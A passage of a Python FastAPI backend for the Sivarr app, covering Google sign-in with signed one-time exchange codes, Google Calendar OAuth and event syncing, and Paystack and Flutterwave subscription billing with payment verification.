        return {"sid": payload["sid"], "name": payload["name"], "email": payload["email"]}
    except Exception:
        return None


def _store_google_xcode(xcode: str, token: str, sid: str, name: str, email: str) -> None:
    """Store a one-time Google exchange code carrying the full session identity.
    Storing sid/name/email in the code itself makes the exchange endpoint resilient
    to cross-worker session-not-found failures: even if the DB session write failed
    on the callback worker, the exchange can reconstruct the session."""
    expires = time.time() + 600  # 10 minutes
    _google_exchange_codes_mem[xcode] = {
        "token": token, "sid": sid, "name": name, "email": email, "expires": expires,
    }
    if db.is_available():
        import json as _json
        payload = _json.dumps({"token": token, "sid": sid, "name": name, "email": email})
        try:
            db.create_google_xcode(xcode, payload)
        except Exception as exc:
            log.warning(f"DB google_xcode store failed ({exc}), memory-only fallback active")


def _pop_google_xcode(xcode: str) -> dict | None:
    """Retrieve and consume a one-time Google exchange code.
    Returns dict with {token, sid, name, email} or None.
    Tries DB first (cross-worker safe), falls back to memory (same-worker)."""
    if db.is_available():
        try:
            raw = db.pop_google_xcode(xcode)
            if raw is not None:
                _google_exchange_codes_mem.pop(xcode, None)  # evict memory copy
                import json as _json
                try:
                    return _json.loads(raw)
                except Exception:
                    return {"token": raw, "sid": "", "name": "", "email": ""}
        except Exception as exc:
            log.warning(f"DB pop_google_xcode failed ({exc}), trying memory")
    entry = _google_exchange_codes_mem.pop(xcode, None)
    if entry and time.time() <= entry["expires"]:
        return {k: entry[k] for k in ("token", "sid", "name", "email")}
    return None


@app.get("/auth/google")
async def google_oauth_start():
    """Redirect to Google consent screen for Sign in with Google."""
    if not GOOGLE_OAUTH_AVAILABLE:
        return RedirectResponse("/app?auth_error=google_not_configured")
    from urllib.parse import urlencode
    state  = _google_make_state()
    params = {
        "client_id":     GOOGLE_CLIENT_ID,
        "redirect_uri":  _google_redirect_uri(),
        "response_type": "code",
        "scope":         "openid email profile",
        "access_type":   "online",
        "prompt":        "select_account",
        "state":         state,
    }
    return RedirectResponse(f"{GOOGLE_AUTH_URL}?{urlencode(params)}")


@app.get("/auth/google/callback")
async def google_oauth_callback(bg: BackgroundTasks, code: str = "", error: str = "", state: str = ""):
    """Exchange Google authorisation code → find/create user → issue one-time exchange code."""
    if error:
        return RedirectResponse("/app?auth_error=google_denied")
    if not code:
        return RedirectResponse("/app?auth_error=google_denied")
    if not GOOGLE_OAUTH_AVAILABLE or not HTTPX_AVAILABLE:
        return RedirectResponse("/app?auth_error=google_not_configured")

    # CSRF check
    if not state or not _google_verify_state(state):
        log.warning("Google OAuth: invalid or expired state parameter")
        return RedirectResponse("/app?auth_error=google_failed")

    # Exchange code for Google access token
    try:
        async with _httpx.AsyncClient(timeout=20) as client:
            tok_resp = await client.post(GOOGLE_TOKEN_URL, data={
                "code":          code,
                "client_id":     GOOGLE_CLIENT_ID,
                "client_secret": GOOGLE_CLIENT_SECRET,
                "redirect_uri":  _google_redirect_uri(),
                "grant_type":    "authorization_code",
            })
            tokens = tok_resp.json()
            if "error" in tokens:
                # warning, not error: this is normal OAuth code-replay/expiry
                # behavior (double-click "Continue with Google", back/refresh
                # after completing the flow once, or a slow consent screen
                # outliving the code's short TTL) — already handled gracefully
                # below (redirect to a retry-able error page, no crash). Kept
                # at warning so it stays in Railway logs without cluttering
                # Sentry's error feed for something that isn't actually a bug.
                log.warning(f"Google token exchange error: {tokens.get('error_description', tokens)}")
                return RedirectResponse("/app?auth_error=google_token_failed")
            info_resp = await client.get(
                GOOGLE_USERINFO_URL,
                headers={"Authorization": f"Bearer {tokens['access_token']}"},
            )
            profile = info_resp.json()
    except Exception as exc:
        log.error(f"Google OAuth HTTP error: {exc}")
        return RedirectResponse("/app?auth_error=google_failed")

    email     = (profile.get("email") or "").lower().strip()
    name      = profile.get("name") or (email.split("@")[0].replace(".", " ").title())
    google_id = profile.get("id") or profile.get("sub") or ""

    if not email:
        return RedirectResponse("/app?auth_error=google_no_email")

    # Find existing user or create one
    users = load_users()
    user  = next((u for u in users.values() if u.get("email", "").lower() == email), None)
    if not user and db.is_available():
        user = db.get_user_by_email(email)

    if not user:
        sid  = uuid.uuid4().hex[:20]
        user = {
            "sid":     sid, "name": name, "email": email, "phone": "",
            "password": "",
            "created": datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M"),
            "role":    "student", "google_id": google_id,
        }
        users[sid] = user
        save_users(users)
        if db.is_available() and not db.user_exists(sid):
            try:
                db.create_user(user)
            except Exception as _e:
                log.error(f"Google register DB error: {_e}")
        # New Google sign-up — email is pre-verified by Google, so there's no
        # verification step; welcome them here instead.
        bg.add_task(send_email, email,
                    "Welcome to Sivarr, your workspace is ready",
                    _email_welcome_html(name))

    sid = user["sid"]
    p   = load_progress(sid)
    if p.get("google_id") != google_id:
        p["google_id"] = google_id
        save_progress(sid, p)

    # Google has verified this email — mark it verified in our DB so the
    # "verify your email" banner never appears for OAuth users.
    if db.is_available():
        try:
            db.mark_email_verified(sid)
        except Exception:
            pass

    log.info(f"Google OAuth login: {user['name']} ({email})")

    # Issue a stateless, HMAC-signed one-time code carrying only the identity.
    # The exchange endpoint mints the session token server-side, so it never
    # travels in a URL, and any gunicorn worker can verify the code without
    # shared storage (no DB / in-memory cross-worker handoff to fail).
    xcode = _google_make_xcode(sid, user["name"], email)

    return RedirectResponse(f"/app?google_code={xcode}")


@app.get("/api/auth/google/exchange")
async def google_token_exchange(response: Response, code: str = ""):
    """Exchange a one-time code for a session token and full login data.

    Returns the same shape as /api/login so the client can call _applyLoginData
    directly, avoiding a second cross-worker HTTP round-trip to /api/session/restore.
    """
    if not code:
        raise HTTPException(400, "Missing code.")

    # Primary path: stateless HMAC-signed code — any worker can verify it with
    # no shared storage. The session token is minted here, server-side.
    ident = _google_verify_xcode(code)
    if ident:
        sid, name, email = ident["sid"], ident["name"], ident["email"]
        token = create_session_token(sid, name, email)
    else:
        # Backward-compat: legacy server-stored opaque code (in-flight codes from
        # a previous deploy). Safe to delete after one deploy cycle.
        xdata = _pop_google_xcode(code)
        if not xdata:
            raise HTTPException(400, "Code not found, already used, or expired. Please sign in again.")
        token = xdata["token"]
        x_sid = xdata.get("sid", "")
        entry = get_session_from_token(token)
        if entry:
            sid, name, email = entry["sid"], entry["name"], entry["email"]
        elif x_sid:
            sid, name, email = x_sid, xdata.get("name", ""), xdata.get("email", "")
            create_session_token_for_existing(token, sid, name, email)
        else:
            raise HTTPException(400, "Session expired. Please sign in again.")

    p = load_progress(sid)
    now_ts = time.time()
    if now_ts - p.get("last_restore_ts", 0) > 1800:
        p["sessions"] = p.get("sessions", 0) + 1
        p["last_restore_ts"] = now_ts
        save_progress(sid, p)

    spaces = db.get_all_spaces_with_data(sid) if db.is_available() else []

    _set_session_cookie(response, token)
    return {
        "sid": sid, "name": p.get("name", name), "email": p.get("email", email),
        "token": token,
        "sessions": p.get("sessions", 1), "difficulty": p.get("difficulty", "medium"),
        "topics": list(p.get("topics", {}).keys()), "weak": weak_topics(p),
        "questions": p.get("questions", 0), "quizzes": len(p.get("quizzes", [])),
        "wrong_count": len(p.get("wrong_answers", [])), "returning": bool(db.get_user_blob(sid, "onboarding")) if db.is_available() else p.get("sessions", 1) > 1,
        "uploaded_files": p.get("uploaded_files", []),
        "spaces": spaces,
        "email_verified": True,
    }


# ═══════════════════════════════════════════════════════════════
#  GOOGLE CALENDAR INTEGRATION
# ═══════════════════════════════════════════════════════════════

# ── Calendar OAuth state (HMAC-signed sid, cross-worker safe) ────────────────
# The OAuth `state` carries only a signed user id with a short TTL — never the
# session token. It can't be forged (HMAC) so it also serves as CSRF protection,
# and even if it appears in a log it can't authenticate anything.
def _gcal_state_key() -> bytes:
    return (GOOGLE_CLIENT_SECRET or "sivarr-fallback").encode() + b":gcal-state-v1"


def _gcal_make_state(sid: str) -> str:
    import base64
    payload = json.dumps({"sid": sid, "exp": int(time.time()) + 600},
                         separators=(",", ":")).encode()
    raw = base64.urlsafe_b64encode(payload).decode().rstrip("=")
    sig = hmac.new(_gcal_state_key(), raw.encode(), "sha256").hexdigest()[:32]
    return f"{raw}.{sig}"


def _gcal_verify_state(state: str) -> str | None:
    """Return the sid if the state signature is valid and unexpired, else None."""
    import base64
    try:
        raw, sig = state.split(".", 1)
        expected = hmac.new(_gcal_state_key(), raw.encode(), "sha256").hexdigest()[:32]
        if not hmac.compare_digest(sig, expected):
            return None
        data = json.loads(base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4)))
        if int(data.get("exp", 0)) < time.time():
            return None
        return data.get("sid")
    except Exception:
        return None


@app.get("/auth/google/calendar")
async def google_cal_connect(request: Request, token: str = ""):
    """Start OAuth flow for Google Calendar (offline, to get refresh token)."""
    if not GOOGLE_OAUTH_AVAILABLE:
        return RedirectResponse("/app?gcal_error=not_configured")
    # Resolve the session from the httpOnly cookie (preferred) so the session
    # token never travels in the URL. Legacy ?token= is accepted as a fallback
    # only — current clients no longer send it.
    sess = get_session_from_token(request.cookies.get(_SESSION_COOKIE_KEY, "") or token)
    if not sess:
        return RedirectResponse("/app?gcal_error=session_expired")
    if _integration_block(load_progress(sess["sid"]), "google_cal"):
        return RedirectResponse("/app?gcal_error=plan_limit")
    from urllib.parse import urlencode
    params = {
        "client_id":     GOOGLE_CLIENT_ID,
        "redirect_uri":  f"{BASE_URL}/auth/google/calendar/callback",
        "response_type": "code",
        "scope":         "https://www.googleapis.com/auth/calendar.events",
        "access_type":   "offline",
        "prompt":        "consent",
        "state":         _gcal_make_state(sess["sid"]),
    }
    return RedirectResponse(f"{GOOGLE_AUTH_URL}?{urlencode(params)}")


@app.get("/auth/google/calendar/callback")
async def google_cal_callback(code: str = "", state: str = "", error: str = ""):
    """Store Google Calendar refresh token for the Sivarr user."""
    if error or not code:
        return RedirectResponse("/app?gcal_error=denied")
    if not GOOGLE_OAUTH_AVAILABLE or not HTTPX_AVAILABLE:
        return RedirectResponse("/app?gcal_error=not_configured")
    sid = _gcal_verify_state(state)
    if not sid:
        return RedirectResponse("/app?gcal_error=session_expired")
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            tok = await client.post(GOOGLE_TOKEN_URL, data={
                "code":          code,
                "client_id":     GOOGLE_CLIENT_ID,
                "client_secret": GOOGLE_CLIENT_SECRET,
                "redirect_uri":  f"{BASE_URL}/auth/google/calendar/callback",
                "grant_type":    "authorization_code",
            })
            tokens = tok.json()
            if "error" in tokens:
                return RedirectResponse("/app?gcal_error=token_failed")
    except Exception as exc:
        log.error(f"Google Calendar OAuth error: {exc}")
        return RedirectResponse("/app?gcal_error=failed")

    p   = load_progress(sid)
    # Encrypted at rest (db.encrypt_secret — same Fernet cipher used for org
    # integration secrets, APP_ENCRYPTION_KEY-gated). These are long-lived
    # OAuth tokens with standing calendar access, stored in the progress blob
    # which also lands in a plaintext JSON file + backup — worth encrypting
    # even though the DB column itself may already be protected at rest.
    p["google_cal_tokens"] = {
        "access_token":  db.encrypt_secret(tokens.get("access_token","")),
        "refresh_token": db.encrypt_secret(tokens.get("refresh_token","")),
        "expiry":        time.time() + tokens.get("expires_in", 3600),
    }
    save_progress(sid, p)
    log.info(f"Google Calendar connected: {sid}")
    return RedirectResponse("/app?gcal_connected=1")


async def _gcal_access_token(sid: str) -> str | None:
    """Return a valid Google Calendar access token, refreshing if needed."""
    if not GOOGLE_OAUTH_AVAILABLE or not HTTPX_AVAILABLE:
        return None
    p    = load_progress(sid)
    gcal = p.get("google_cal_tokens", {})
    refresh_token = db.decrypt_secret(gcal.get("refresh_token", ""))
    if not refresh_token:
        return None
    if time.time() < gcal.get("expiry", 0) - 300:
        return db.decrypt_secret(gcal.get("access_token", ""))
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(GOOGLE_TOKEN_URL, data={
                "client_id":     GOOGLE_CLIENT_ID,
                "client_secret": GOOGLE_CLIENT_SECRET,
                "refresh_token": refresh_token,
                "grant_type":    "refresh_token",
            })
            data = resp.json()
            if "access_token" not in data:
                # Token was revoked/expired at Google — clear it so the UI
                # stops reporting "connected" and prompts a reconnect.
                if data.get("error") in ("invalid_grant", "invalid_token"):
                    p.pop("google_cal_tokens", None)
                    save_progress(sid, p)
                return None
            new_access = data["access_token"]
            gcal["access_token"] = db.encrypt_secret(new_access)
            gcal["expiry"]       = time.time() + data.get("expires_in", 3600)
            p["google_cal_tokens"] = gcal
            save_progress(sid, p)
            return new_access
    except Exception as exc:
        log.error(f"Google Calendar token refresh error: {exc}")
        return None


@app.get("/api/integrations/gcal/status")
async def gcal_status(token: str = ""):
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p    = load_progress(sess["sid"])
    gcal = p.get("google_cal_tokens", {})
    return {"connected": bool(gcal.get("refresh_token"))}


@app.get("/api/integrations/gcal/events")
async def gcal_events(token: str = "", time_min: str = "", time_max: str = ""):
    """Fetch events from the user's primary Google Calendar."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    access = await _gcal_access_token(sess["sid"])
    if not access:
        raise HTTPException(403, "Google Calendar not connected.")
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            qp = {"singleEvents": "true", "orderBy": "startTime", "maxResults": "100"}
            if time_min: qp["timeMin"] = time_min
            if time_max: qp["timeMax"] = time_max
            resp = await client.get(
                f"{GOOGLE_CAL_API}/calendars/primary/events",
                headers={"Authorization": f"Bearer {access}"},
                params=qp,
            )
            data = resp.json()
    except Exception as exc:
        log.error(f"Google Calendar events error: {exc}")
        raise HTTPException(502, "Google Calendar unreachable.")
    events = []
    for item in data.get("items", []):
        s = item.get("start", {}); e = item.get("end", {})
        events.append({
            "id":      item.get("id",""),
            "title":   item.get("summary","(No title)"),
            "start":   s.get("dateTime") or s.get("date",""),
            "end":     e.get("dateTime") or e.get("date",""),
            "allDay":  "date" in s,
            "source":  "google",
            "color":   "#4285F4",
            "htmlLink": item.get("htmlLink",""),
        })
    return {"events": events}


@app.post("/api/integrations/gcal/push")
async def gcal_push(data: dict):
    """Push a Sivarr calendar event to the user's Google Calendar."""
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    access = await _gcal_access_token(sess["sid"])
    if not access:
        raise HTTPException(403, "Google Calendar not connected.")

    title  = sanitize_text(str(data.get("title","Untitled")), 200)
    start  = sanitize_text(str(data.get("start","")), 40)
    end    = sanitize_text(str(data.get("end","") or data.get("start","")), 40)
    all_day = bool(data.get("allDay", False))
    desc   = sanitize_text(str(data.get("description","")), 1000)

    # Use the caller's IANA timezone so the event lands at the right local time.
    # Validate against the tz database; fall back to UTC for anything unknown.
    tz = sanitize_text(str(data.get("tz","") or "UTC"), 64)
    try:
        from zoneinfo import ZoneInfo
        ZoneInfo(tz)                      # raises if the zone is unknown
    except Exception:
        tz = "UTC"

    if all_day:
        body = {"summary": title, "description": desc,
                "start": {"date": start[:10]}, "end": {"date": end[:10]}}
    else:
        if "T" not in start:
            start = start + "T09:00:00"
            end   = end   + "T10:00:00"
        body = {"summary": title, "description": desc,
                "start": {"dateTime": start, "timeZone": tz},
                "end":   {"dateTime": end,   "timeZone": tz}}
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(
                f"{GOOGLE_CAL_API}/calendars/primary/events",
                headers={"Authorization": f"Bearer {access}", "Content-Type": "application/json"},
                json=body,
            )
            result = resp.json()
    except Exception as exc:
        log.error(f"Google Calendar push error: {exc}")
        raise HTTPException(502, "Google Calendar unreachable.")
    if "id" not in result:
        raise HTTPException(400, result.get("error",{}).get("message","Push failed."))
    return {"ok": True, "gcal_id": result["id"], "htmlLink": result.get("htmlLink","")}


@app.post("/api/integrations/gcal/disconnect")
async def gcal_disconnect(data: dict):
    """Revoke the Google Calendar token at Google and clear it locally."""
    sess = get_session_from_token(data.get("token", ""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid  = sess["sid"]
    p    = load_progress(sid)
    gcal = p.get("google_cal_tokens", {})
    tok  = db.decrypt_secret(gcal.get("refresh_token", "")) or db.decrypt_secret(gcal.get("access_token", ""))
    # Best-effort revoke at Google so our access is actually withdrawn,
    # not just forgotten locally. Never let a revoke failure block disconnect.
    if tok and HTTPX_AVAILABLE:
        try:
            async with _httpx.AsyncClient(timeout=10) as client:
                await client.post("https://oauth2.googleapis.com/revoke",
                                  params={"token": tok})
        except Exception as exc:
            log.warning(f"Google Calendar revoke (non-fatal) for {sid}: {exc}")
    p.pop("google_cal_tokens", None)
    save_progress(sid, p)
    log.info(f"Google Calendar disconnected: {sid}")
    return {"ok": True}


# ═══════════════════════════════════════════════════════════════
#  PAYSTACK SUBSCRIPTION BILLING
# ═══════════════════════════════════════════════════════════════

@app.get("/api/billing/plans")
async def billing_plans():
    rate = get_naira_rate()
    def _disp_usd(usd):
        return ("$%g" % usd)                       # 12 → "$12", 4.99 → "$4.99"
    display = []
    for pid, pl in SIVARR_PLANS.items():
        if pl.get("hidden"):
            continue
        usd = pl.get("amount_usd", 0)
        ngn = plan_charge_ngn(pl)
        display.append({
            "id": pid, "name": pl["name"], "space": pl.get("space", "personal"),
            "period": pl["period"], "label": pl.get("label", ""),
            "amount_usd": usd, "display_usd": _disp_usd(usd),
            "per_seat": bool(pl.get("per_seat")), "addon": bool(pl.get("addon")),
            "fx": {"currency": "NGN", "rate": rate,
                   "amount_ngn": ngn, "display_local": f"≈ ₦{ngn:,}"},
        })
    return {
        "plans": SIVARR_PLANS,        # legacy shape (still consumed elsewhere)
        "display": display,           # enriched: USD anchor + live NGN conversion
        "naira_rate": rate,
        "paystack_pk": PAYSTACK_PUBLIC_KEY,
        "paystack_available": PAYSTACK_AVAILABLE,
    }


@app.post("/api/billing/subscribe")
async def billing_subscribe(data: dict):
    """Initialize a Paystack transaction for a Sivarr subscription plan."""
    sess = get_session_from_token(data.get("token",""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not PAYSTACK_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Paystack not configured.")
    plan_id = sanitize_text(str(data.get("plan","")), 30)
    plan    = SIVARR_PLANS.get(plan_id)
    if not plan:
        raise HTTPException(400, "Invalid plan.")
    sid   = sess["sid"]
    email = sess.get("email","")
    if not email:
        email = load_progress(sid).get("email","")
    reference = f"sivbill_{uuid.uuid4().hex[:16]}"
    charge_ngn = plan_charge_ngn(plan)   # USD anchor → NGN at the current live rate
    payload = {
        "email":        email or f"user_{sid}@sivarr.com",
        "amount":       charge_ngn * 100,
        "currency":     "NGN",
        "reference":    reference,
        "callback_url": f"{BASE_URL.rstrip('/')}/billing/callback",
        "metadata": {
            "sivarr_sid": sid, "plan_id": plan_id,
            "plan_name": plan["name"], "period": plan["period"],
            # Lock the charged NGN so verify checks against what we actually billed,
            # not a recomputation (the FX rate can change between init and verify).
            "amount_ngn": charge_ngn,
        },
    }
    headers = {"Authorization": f"Bearer {PAYSTACK_SECRET_KEY}", "Content-Type": "application/json"}
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(f"{PAYSTACK_API}/transaction/initialize",
                                     json=payload, headers=headers)
        result = resp.json()
    except Exception as exc:
        log.error(f"Billing subscribe error: {exc}")
        raise HTTPException(502, "Paystack API unreachable.")
    if not result.get("status"):
        raise HTTPException(400, result.get("message","Paystack error."))
    return {
        "authorization_url": result["data"]["authorization_url"],
        "reference": reference, "plan_id": plan_id, "amount_ngn": charge_ngn,
    }


async def _billing_apply_org_paystack(sid: str, meta: dict, tx: dict, reference: str) -> dict:
    """Activate an org seat subscription after a verified Paystack org payment.
    Only the org owner can activate; amount must cover the locked NGN."""
    org_id = meta.get("org_id", "")
    org = await asyncio.to_thread(db.get_org_by_member, sid) if db.is_available() else None
    if not org or org.get("id") != org_id or org.get("owner_sid") != sid:
        raise HTTPException(403, "Only the org owner can activate this subscription.")
    expected_ngn = int(meta.get("amount_ngn") or 0)
    paid_kobo    = int(tx.get("amount", 0) or 0)
    if (tx.get("currency") or "").upper() != "NGN" or expected_ngn <= 0 or paid_kobo < expected_ngn * 100:
        log.warning(f"Org verify amount mismatch ref={reference}: paid {paid_kobo} need {expected_ngn*100}")
        raise HTTPException(400, "Payment amount does not match the seat total.")
    existing = (org.get("settings") or {}).get("subscription") or {}
    if existing.get("reference") == reference:   # idempotent re-verify
        return {"ok": True, "org_id": org_id, "idempotent": True, "subscription": existing}
    seats  = int(meta.get("seats") or await asyncio.to_thread(db.count_org_members, org_id))
    period = "yearly" if meta.get("period") == "yearly" else "monthly"
    now    = datetime.datetime.utcnow()
    expires = (now + datetime.timedelta(days=365 if period == "yearly" else 30)).strftime("%Y-%m-%d")
    sub = {
        "name": "Org", "plan": "org_base", "seats": seats, "period": period,
        "status": "active", "expires": expires, "reference": reference,
        "gateway": "paystack", "activated": now.strftime("%Y-%m-%d"),
        "amount_ngn": expected_ngn,
    }
    await asyncio.to_thread(db.set_org_subscription, org_id, sub)
    log.info(f"Org billing: {org_id} → {seats} seats ({period}) expires {expires}")
    return {"ok": True, "org_id": org_id, "subscription": sub}


async def _billing_apply_org_flutterwave(sid: str, meta: dict, data: dict, reference: str) -> dict:
    """Activate an org seat subscription after a verified Flutterwave org payment.
    Flutterwave amounts are in the major unit (NGN), not kobo."""
    org_id = meta.get("org_id", "")
    org = await asyncio.to_thread(db.get_org_by_member, sid) if db.is_available() else None
    if not org or org.get("id") != org_id or org.get("owner_sid") != sid:
        raise HTTPException(403, "Only the org owner can activate this subscription.")
    expected_ngn = int(meta.get("amount_ngn") or 0)
    try:
        paid = float(data.get("amount", 0) or 0)
    except (TypeError, ValueError):
        paid = 0.0
    if (data.get("currency") or "").upper() != "NGN" or expected_ngn <= 0 or paid < expected_ngn:
        log.warning(f"Org FLW verify amount mismatch ref={reference}: paid {paid} need {expected_ngn}")
        raise HTTPException(400, "Payment amount does not match the seat total.")
    existing = (org.get("settings") or {}).get("subscription") or {}
    if existing.get("reference") == reference:
        return {"ok": True, "org_id": org_id, "idempotent": True, "subscription": existing}
    seats  = int(meta.get("seats") or await asyncio.to_thread(db.count_org_members, org_id))
    period = "yearly" if meta.get("period") == "yearly" else "monthly"
    now    = datetime.datetime.utcnow()
    expires = (now + datetime.timedelta(days=365 if period == "yearly" else 30)).strftime("%Y-%m-%d")
    sub = {
        "name": "Org", "plan": "org_base", "seats": seats, "period": period,
        "status": "active", "expires": expires, "reference": reference,
        "gateway": "flutterwave", "activated": now.strftime("%Y-%m-%d"),
        "amount_ngn": expected_ngn,
    }
    await asyncio.to_thread(db.set_org_subscription, org_id, sub)
    log.info(f"Org billing (FLW): {org_id} → {seats} seats ({period}) expires {expires}")
    return {"ok": True, "org_id": org_id, "subscription": sub}


@app.get("/api/billing/verify/{reference}")
async def billing_verify(reference: str, token: str = ""):
    """Verify a billing payment and activate the user's subscription."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not PAYSTACK_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Paystack not configured.")
    reference = sanitize_text(reference, 80)
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(f"{PAYSTACK_API}/transaction/verify/{reference}",
                headers={"Authorization": f"Bearer {PAYSTACK_SECRET_KEY}"})
        result = resp.json()
    except Exception as exc:
        log.error(f"Billing verify error: {exc}")
        raise HTTPException(502, "Paystack API unreachable.")
    if not result.get("status") or result["data"]["status"] != "success":
        raise HTTPException(400, "Payment not confirmed.")
    tx   = result["data"]
    meta = tx.get("metadata", {}) or {}

    # Bind the payment to the authenticated user — prevents replaying another
    # user's reference onto your own account.
    if meta.get("sivarr_sid") and meta.get("sivarr_sid") != sess["sid"]:
        raise HTTPException(403, "This payment belongs to a different account.")
    sid = sess["sid"]

    # Org seat subscriptions are applied to the org, not the user's personal plan.
    if meta.get("kind") == "org" and meta.get("org_id"):
        return await _billing_apply_org_paystack(sid, meta, tx, reference)

    # Derive the plan from the server-set metadata, then verify the amount and
    # currency actually cover it — never trust a client-supplied plan or amount.
    plan_id = meta.get("plan_id", "")
    plan    = SIVARR_PLANS.get(plan_id)
    if not plan:
        log.error(f"Paystack verify: unknown plan_id {plan_id!r} ref={reference}")
        raise HTTPException(400, "Could not determine the plan for this payment.")
    # Expected NGN = what we locked at initialize (FX-stable); fall back to a live
    # recompute only if the metadata is missing (older references).
    expected_ngn = int(meta.get("amount_ngn") or plan_charge_ngn(plan))
    paid_kobo = int(tx.get("amount", 0) or 0)
    if (tx.get("currency") or "").upper() != "NGN" or paid_kobo < expected_ngn * 100:
        log.warning(f"Paystack verify amount mismatch ref={reference}: paid {paid_kobo} kobo "
                    f"{tx.get('currency')}, need {expected_ngn * 100} kobo for {plan_id}")
        raise HTTPException(400, "Payment amount does not match the selected plan.")

    p = load_progress(sid)
    # Idempotency — don't re-apply a reference already in billing history.
    if any(h.get("reference") == reference for h in p.get("billing_history", [])):
        sub = p.get("subscription", {})
        return {"ok": True, "plan": sub.get("plan", plan_id),
                "name": sub.get("name", plan["name"]),
                "expires": sub.get("expires", ""), "idempotent": True}

    now     = datetime.datetime.utcnow()
    expires = (now + datetime.timedelta(days=365 if plan.get("period")=="yearly" else 30)).strftime("%Y-%m-%d")
    p["subscription"] = {
        "plan": plan_id, "name": plan.get("name","Pro"), "status": "active",
        "expires": expires, "reference": reference,
        "activated": now.strftime("%Y-%m-%d"),
        "gateway": "paystack",
    }
    history = p.get("billing_history", [])
    history.insert(0, {
        "date": now.strftime("%Y-%m-%d"),
        "plan": plan.get("name","Pro"),
        "amount": f"₦{expected_ngn:,}",
        "reference": reference,
        "gateway": "paystack",
        "status": "paid",
    })
    p["billing_history"] = history[:20]
    save_progress(sid, p)
    log.info(f"Billing: {sid} → {plan_id} expires {expires}")
    return {"ok": True, "plan": plan_id, "name": plan.get("name","Pro"), "expires": expires}


@app.get("/api/billing/status")
async def billing_status(token: str = ""):
    """Return the current user's active subscription plan."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p   = load_progress(sess["sid"])
    sub = p.get("subscription", {})
    if not sub:
        return {"plan": "free", "name": "Free", "status": "active"}
    if sub.get("expires"):
        try:
            if datetime.datetime.utcnow() > datetime.datetime.strptime(sub["expires"], "%Y-%m-%d"):
                return {"plan": "free", "name": "Free", "status": "expired", "expired_at": sub["expires"]}
        except ValueError:
            pass
    return sub


@app.get("/api/billing/entitlements")
async def billing_entitlements(token: str = ""):
    """Return the user's plan feature caps + current usage, for client gating/prompts."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    caps = _plan_caps(p)
    usage = {"integrations": sum(1 for v in _user_integrations(p).values() if v)}
    org_sub_active = False
    try:
        if db.is_available():
            usage["spaces"]    = len(db.get_spaces(sess["sid"]) or [])
            usage["templates"] = db.count_downloads(sess["sid"])
            _org = db.get_org_by_member(sess["sid"])
            if _org:
                org_sub_active = _org_sub_active(_org)
    except Exception:
        pass
    return {"plan": _plan_name(p), "caps": caps, "usage": usage,
            "org_sub_active": org_sub_active}


@app.post("/api/billing/org/quote")
async def billing_org_quote(data: dict):
    """Seat-pricing quote for the caller's org at the current member count."""
    sess = get_session_from_token(data.get("token", ""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    org = await asyncio.to_thread(db.get_org_by_member, sess["sid"])
    if not org:
        raise HTTPException(404, "You're not in an organisation.")
    period = "yearly" if str(data.get("period")) == "yearly" else "monthly"
    members = await asyncio.to_thread(db.count_org_members, org["id"])
    try:
        requested = int(data.get("seats") or 0)
    except (ValueError, TypeError):
        requested = 0
    # Owners can buy seats ahead of inviting. Floor at current member count
    # (can't have fewer seats than members); +1 surfaces the custom-pricing tier.
    seats = min(max(members, requested, 1), ORG_SELFSERVE_MAX + 1)
    q = org_seat_quote(seats, period)
    q["org_id"]    = org["id"]
    q["is_owner"]  = (org.get("owner_sid") == sess["sid"])
    q["current"]   = (org.get("settings") or {}).get("subscription") or None
    q["members"]   = members
    q["max_seats"] = ORG_SELFSERVE_MAX
    return q


@app.post("/api/billing/org/subscribe")
async def billing_org_subscribe(data: dict):
    """Initialize a Paystack payment for the org's seat subscription (owner only)."""
    sess = get_session_from_token(data.get("token", ""))
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    sid = sess["sid"]
    org = await asyncio.to_thread(db.get_org_by_member, sid)
    if not org:
        raise HTTPException(404, "You're not in an organisation.")
    if org.get("owner_sid") != sid:
        raise HTTPException(403, "Only the org owner can manage billing.")
    period = "yearly" if str(data.get("period")) == "yearly" else "monthly"
    members = await asyncio.to_thread(db.count_org_members, org["id"])
    try:
        requested = int(data.get("seats") or 0)
    except (ValueError, TypeError):
        requested = 0
    seats = min(max(members, requested, 1), ORG_SELFSERVE_MAX)
    total_usd = org_seat_total_usd(seats, period)
    if total_usd is None:
        raise HTTPException(400, "Orgs with 51+ seats use custom enterprise pricing. Contact sales.")
    charge_ngn = int(round(total_usd * get_naira_rate()))
    email   = sess.get("email", "") or load_progress(sid).get("email", "")
    gateway = "flutterwave" if str(data.get("gateway")) == "flutterwave" else "paystack"

    # ── Flutterwave ──
    if gateway == "flutterwave":
        if not FLUTTERWAVE_AVAILABLE or not HTTPX_AVAILABLE:
            raise HTTPException(503, "Flutterwave not configured.")
        ref = f"FLWORG-{sid[:8].upper()}-{int(time.time())}"
        payload = {
            "tx_ref":       ref,
            "amount":       str(charge_ngn),
            "currency":     "NGN",
            "redirect_url": f"{BASE_URL.rstrip('/')}/app?flw_billing=success&ref={ref}",
            "customer":     {"email": email or f"user_{sid}@sivarr.com",
                             "name": load_progress(sid).get("name", "User")},
